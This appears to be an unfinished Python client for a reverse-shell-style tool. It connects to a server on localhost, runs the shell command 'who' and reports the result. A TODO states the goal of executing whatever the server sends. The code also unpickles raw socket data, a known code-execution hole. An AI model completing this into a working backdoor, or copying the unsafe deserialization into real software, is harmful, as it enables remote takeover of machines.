import socket
import pickle
import subprocess
import time

#||||||||||||||||||||||||||||||CLIENT||||||||||||||||||||||||||

#TODO
#   1.  At line 34, have the client execute whatever it receives and send it back to the server


socket = socket.socket()
serverAddress = 'localhost', 1111

#   --> Execute a command and return the result of it
def popenExecution(data):
    command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    return str(command.stdout.read() + command.stderr.read(), "utf-8")

def recv(socket):
    try:
        message = pickle.loads(socket.recv(2048))
        print(message)
    except Exception as e:
        print(e)

def main():
    
    socket.connect(serverAddress)
    #Standard command to identify who this machine is
    socket.send(pickle.dumps(popenExecution("who").split()[0])) #send the first result of who
    while True:
        recv(socket)
        time.sleep(1)


main()
